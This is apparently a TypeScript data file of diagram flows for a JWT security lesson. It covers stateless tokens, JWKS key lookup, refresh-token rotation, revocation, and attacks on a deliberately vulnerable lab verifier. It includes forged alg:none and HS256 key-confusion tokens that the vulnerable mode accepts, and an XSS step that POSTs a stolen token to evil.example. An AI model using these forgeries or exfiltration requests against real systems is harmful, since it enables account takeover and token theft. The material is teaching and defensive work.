import type { Flow } from "@/components/flow/types";

// Raw messages mirror the Lab 02 HTTP contract (labs/02-jwt): RS256 access tokens, an opaque `rt` refresh cookie
// scoped to /refresh, RFC 6750 WWW-Authenticate answers, and the vulnerable-mode verifier. The tokens below are
// real RS256/HS256 tokens built with a throwaway key, so they decode in the TokenDecoder but verify nowhere.
const ACCESS = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.CuGey27Ie14YL8uqlMkjrCUvVECt6nDd3iZ6EFC_cofWogIgkOrRN7gjzi21UEXXRuakSzfYSFE8d4aqWWNXAEe3BAdzyxdkd6hp66gXfat5Pfb1ynDtmqga2Vn9zi3DlxNpNqHgF1XyzrMHOO6xKiM9at_MByW_OSwdvkyh080odZoFDV9yRFezLzhhVtxBegtSd_bdXmoniQTExoMwD8snHVvxI3tj-tIRxO-x6gIi5IODrb1tJ4-PxDRhn60sv4iqofrDGRU3K8J0WkTRhjK812h2NMEITMukC2KnWL7Sorcuwd186gFHtXIWKYbiB-TqXPn4iNwCOHuwXFmfag";
const ACCESS2 = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1OTAwLCJleHAiOjE3NjcyMjYyMDAsImp0aSI6InE4THpUMHZOMmNZcDVIc0s5ZFdtM1JiWDdlSmdBMXVGb1ppRTR0UWhCNmMifQ.FOvHwCTsYvaCv3C_WcS_VcHNIwZQD-NvxKWelbSjLVLcAL2ml7HjsNDsNDZvTV8-mm9CYAQpLrQL8FwmOw-niJWCSE9lgvemK0YWUSMkvsO5ls8hJXcBeKag0y4lMUGQdQw7-qLVRdy3oTFU9dEyrDzcR2e6vEJjd7nzarDXQKyn0Y-IgJptgncuqN3d4nqQR5sU9Eg3SmsEKqMHPuGOsWA1sgSxMBVLAX9R3tXpZqEltAHaAb5vPvMrpH1xe3WxzYkYY3Wg7wWloFCu7o_XorG229cTY7P0FgPAgbRg6HKWYYPkQ-tc1lUjrLvFqD7R5fLfb_MAaxEFSr-iLtDPkw";
const NONE = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiJmb3JnZWQtdXNlciIsImVtYWlsIjoiZm9yZ2VkQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.";
const HS = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiJmb3JnZWQtdXNlciIsImVtYWlsIjoiZm9yZ2VkQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.oVLSryJSftBRe7P1tqQ1q0KXwXNilstKhG5SGUSwUtI";
const EXPIRED = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjIxNzAwLCJleHAiOjE3NjcyMjIwMDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.YkQ3BYWQaZAVNcr0qOzqwrMKNQIJMSATIgT3hlacbPtIPt2bA_1AyWxAh1rChYjDrPm4cwUP8yAKeLpwzqE5pAw1Nn0umCIErxK11IHfLne-wm2ab3JKs0GqgI7xc9i_qMviLb8nXgWqy6arGm_gBtq7CTM27wV7j1ute4KY4Md-78xpqmfO_X_cTY6FbRjjARhE9gN2-sGc6XOYCWOcGPr1S3pAVjG1L4NSJDXN3nqT3BEP2C9iAU9LYz5hwnTRTDoXp0TQLCawlnU05w4lPtWUfozbc4Q1g2yHK1OPAmx1TPVcz2nhplBbtBy9SX0v31gLahdqGYitX7MUnZXzIw";
const RT1 = "Xk3q9ZmB1vW8eYrT5uLpA7sD0fGhJcN4iOaE6bQwVyU";
const RT2 = "q8LzT0vN2cYp5HsK9dWm3RbX7eJgA1uFoZiE4tQhB6c";
const HOST = "Host: localhost:4102";
const JSON_HDR = "Content-Type: application/json";
const rtCookie = (t: string) => `Set-Cookie: rt=${t}; Path=/refresh; Max-Age=1209600; HttpOnly; SameSite=Strict`;
const tokenBody = (t: string) => `{"access_token":"${t}","token_type":"Bearer","expires_in":300}`;
const loginOk = (access: string, rt: string) => `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n${rtCookie(rt)}\n\n${tokenBody(access)}`;
const profile = (token: string) => `GET /api/profile HTTP/1.1\n${HOST}\nAuthorization: Bearer ${token}`;
const profileOk = `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"6f1c2b9e-3a4d-4e8f-9b1a-7c5d2e0f8a34","email":"alice@example.com"}`;
const invalid401 = `HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token"\n${JSON_HDR}\nCache-Control: no-store\n\n{"error":"invalid token"}`;
const refreshReq = (rt: string) => `POST /refresh HTTP/1.1\n${HOST}\nCookie: rt=${rt}`;
const refresh401 = `HTTP/1.1 401 Unauthorized\n${JSON_HDR}\nCache-Control: no-store\n\n{"error":"invalid refresh token"}`;
const loginReq = `POST /login HTTP/1.1\n${HOST}\n${JSON_HDR}\n\n{"email":"alice@example.com","password":"correct-horse-battery"}`;

const statefulVsStateless: Flow = {
  id: "statefulVsStateless",
  title: "A self-contained token: the API verifies it without a database lookup",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "api", label: "API", kind: "api" },
  ],
  steps: [
    { from: "browser", to: "api", label: "POST /login", http: loginReq, note: "Authentication happens once, exactly like in Module 1." },
    { from: "api", to: "browser", label: "200 + access token", http: loginOk(ACCESS, RT1), note: "The reply carries a signed JWT. Claims such as who the user is and when the token expires travel inside it. The refresh cookie comes later, in lesson 3." },
    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Every later call presents the token in the Authorization header. Nothing is stored on the server for it." },
    { from: "api", to: "api", label: "verify signature + claims", note: "The API checks the signature with its key and reads iss, aud and exp from the token itself. No session table, no database round trip." },
    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "The price of this design: the server cannot take the token back before it expires. Lesson 6 is about that." },
  ],
};

const jwksVerify: Flow = {
  id: "jwksVerify",
  title: "Verifying with a public key published as a JWKS",
  actors: [
    { id: "browser", label: "Client", kind: "browser" },
    { id: "api", label: "API", kind: "api" },
    { id: "as", label: "Auth server", kind: "as" },
  ],
  steps: [
    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "The token header says alg RS256 and kid k3Hq9ZmB1vW8eYrT: which key signed it." },
    { from: "api", to: "as", label: "GET /.well-known/jwks.json", http: `GET /.well-known/jwks.json HTTP/1.1\n${HOST}`, note: "The API does not have the key yet, so it asks the issuer for its public keys. In the lab one process plays both roles." },
    {
      from: "as",
      to: "api",
      label: "200 JWKS",
      http: `HTTP/1.1 200 OK\n${JSON_HDR}\n\n{"keys":[{"kty":"RSA","n":"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw","e":"AQAB","kid":"k3Hq9ZmB1vW8eYrT","alg":"RS256","use":"sig"}]}`,
      note: "A JWK Set: public keys only, each with a kid. The modulus n is an example value here. Anyone may fetch this document, and it is safe because a public key cannot sign.",
    },
    { from: "api", to: "api", label: "pick key by kid, verify RS256", note: "kid selects the key. The API pins the algorithm to RS256 itself and never lets the token choose. Then it checks iss, aud and exp." },
    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "The API now caches the JWKS and refetches only when it meets an unknown kid. That is how a key rotation reaches every verifier." },
  ],
};

const refreshRotation: Flow = {
  id: "refreshRotation",
  title: "Refresh token rotation, and what happens when an old one comes back",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "server", label: "Server", kind: "server" },
    { id: "db", label: "Database", kind: "db" },
    { id: "attacker", label: "Thief", kind: "attacker" },
  ],
  steps: [
    { from: "browser", to: "server", label: "POST /login", http: loginReq, note: "Authentication, once." },
    { from: "server", to: "db", label: "INSERT refresh token (new family)", note: "A fresh 32-byte random refresh token starts a family. Only its sha256 is stored. It is opaque: not a JWT, so the server can revoke it." },
    { from: "server", to: "browser", label: "200 + access token + rt cookie", http: loginOk(ACCESS, RT1), note: "A 5-minute access token in the body, and the refresh token in an HttpOnly cookie that is only sent to /refresh." },
    { from: "browser", to: "server", label: "GET /api/profile (token expired)", http: profile(EXPIRED), note: "Five minutes later the access token has expired." },
    { from: "server", to: "browser", label: "401 invalid_token", http: invalid401, note: "The client knows what to do next: ask for a new access token." },
    { from: "browser", to: "server", label: "POST /refresh", http: refreshReq(RT1), note: "The browser attaches the rt cookie by itself. The page's JavaScript never sees it." },
    { from: "server", to: "db", label: "retire rt1, insert rt2", note: "In one transaction: mark rt1 as used and store its successor in the same family. The row is locked, so two concurrent refreshes cannot both win." },
    { from: "server", to: "browser", label: "200 + new access + new rt", http: loginOk(ACCESS2, RT2), note: "A new access token and a new refresh cookie. rt1 is now spent." },
    { from: "attacker", to: "server", label: "POST /refresh (stolen rt1)", http: refreshReq(RT1), note: "Later, someone replays the old refresh token they copied.", danger: true },
    { from: "server", to: "db", label: "rt1 already used: revoke the family", note: "REUSE DETECTION. A spent token coming back means it was copied, so the whole family is revoked, rt2 included." },
    { from: "server", to: "attacker", label: "401", http: refresh401, note: "The thief gets nothing. The victim's next refresh fails too, so they log in again, and that is the alarm." },
  ],
};

const xssTheft: Flow = {
  id: "xssTheft",
  title: "XSS against a token in localStorage, and against an HttpOnly cookie",
  actors: [
    { id: "browser", label: "Victim's page", kind: "browser" },
    { id: "attacker", label: "Attacker", kind: "attacker" },
    { id: "server", label: "API", kind: "api" },
  ],
  steps: [
    { from: "attacker", to: "browser", label: "inject <script>", note: "A comment field, a dependency or an ad lets the attacker's script run in your page, with your origin's full privileges.", danger: true },
    { from: "browser", to: "browser", label: "localStorage.getItem('access_token')", note: "Any script on the origin can read localStorage and sessionStorage. The token is right there.", danger: true },
    { from: "browser", to: "attacker", label: "POST evil.example/steal", http: `POST /steal HTTP/1.1\nHost: evil.example\n${JSON_HDR}\n\n{"t":"${ACCESS.slice(0, 40)}…"}`, note: "The script sends the token to the attacker's server.", danger: true },
    { from: "attacker", to: "server", label: "GET /api/profile", http: profile(ACCESS), note: "The attacker replays the token from their own machine. A JWT is a bearer token, so the server cannot tell this apart from the victim.", danger: true },
    { from: "server", to: "attacker", label: "200 (until exp)", http: profileOk, note: "It works until the token expires. A short lifetime limits the loss." },
    { from: "browser", to: "browser", label: "document.cookie", note: "Now the HttpOnly rt cookie: document.cookie does not list it, so the script has nothing to read and send." },
    { from: "browser", to: "server", label: "POST /refresh (from the page)", http: refreshReq("(sent by the browser, invisible to the script)"), note: "Honest part: while the page is open the script can still call /refresh and the browser attaches the cookie. It gets an access token for that session, but never the refresh token itself.", danger: true },
  ],
};

const algNone: Flow = {
  id: "algNone",
  title: "Forged tokens against a verifier that trusts the token's own header",
  actors: [
    { id: "attacker", label: "Attacker", kind: "attacker" },
    { id: "server", label: "API", kind: "api" },
  ],
  steps: [
    { from: "attacker", to: "attacker", label: "craft header + payload", note: "Header {\"typ\":\"JWT\",\"alg\":\"none\"}, payload claiming sub forged-user, and an empty signature. No key is needed.", danger: true },
    { from: "attacker", to: "server", label: "GET /api/profile (vulnerable mode)", http: `${profile(NONE)}\nX-Lab-Mode: vulnerable`, note: "The token ends in a dot with nothing after it: an unsigned JWT.", danger: true },
    { from: "server", to: "server", label: "naive verifier reads alg from the token", note: "FLAW 1 and 2. It trusts the attacker-supplied alg header, sees none, and skips signature verification.", danger: true },
    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"forged-user","email":"forged@example.com"}`, note: "The API accepted a token nobody signed.", danger: true },
    { from: "attacker", to: "server", label: "same token, secure mode", http: profile(NONE), note: "Now the identical token against the default, secure verifier." },
    { from: "server", to: "attacker", label: "401 invalid_token", http: invalid401, note: "The secure verifier pins RS256, so alg none is rejected before any claim is looked at. It also answers with a RFC 6750 WWW-Authenticate header." },
    { from: "attacker", to: "server", label: "key confusion: HS256 signed with the public key", http: `${profile(HS)}
X-Lab-Mode: vulnerable`, note: "A second forgery. alg HS256, and an HMAC computed with the server's own public key text as the secret. Anyone can fetch that key.", danger: true },
    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK
${JSON_HDR}
Cache-Control: no-store

{"sub":"forged-user","email":"forged@example.com"}`, note: "The naive verifier switched to HMAC because the header said so, and used the public key as the secret. The secure verifier answers 401 here too: it only ever accepts RS256.", danger: true },
  ],
};

const revocation: Flow = {
  id: "revocation",
  title: "Logout revokes the refresh family, but the access token lives on until exp",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "server", label: "Server", kind: "server" },
    { id: "db", label: "Database", kind: "db" },
  ],
  steps: [
    { from: "browser", to: "server", label: "POST /refresh/logout", http: `POST /refresh/logout HTTP/1.1\n${HOST}\nCookie: rt=${RT2}`, note: "Logout lives under /refresh because the rt cookie is only sent to that path." },
    { from: "server", to: "db", label: "revoke the family", note: "Every token in the family, used or not, gets revoked_at. Only the hash was ever stored." },
    { from: "server", to: "browser", label: "204 + clear cookie", http: "HTTP/1.1 204 No Content\nSet-Cookie: rt=; Path=/refresh; Max-Age=0; HttpOnly; SameSite=Strict", note: "The cookie is deleted in the browser as well." },
    { from: "browser", to: "server", label: "POST /refresh (same rt)", http: refreshReq(RT2), note: "Anyone who kept a copy of the refresh token tries it." },
    { from: "server", to: "browser", label: "401", http: refresh401, note: "Revoked. This is the revocation you can enforce: refresh requires a database check." },
    { from: "browser", to: "server", label: "GET /api/profile (access token, 2 min left)", http: profile(ACCESS2), note: "But the access token was already issued and is verified offline." },
    { from: "server", to: "browser", label: "200 until exp", http: profileOk, note: "No lookup means no revocation: the token stays valid until exp, at most 5 minutes here. That is the trade-off behind short lifetimes.", danger: true },
  ],
};

export const m2Flows = { statefulVsStateless, jwksVerify, refreshRotation, xssTheft, algNone, revocation } satisfies Record<string, Flow>;
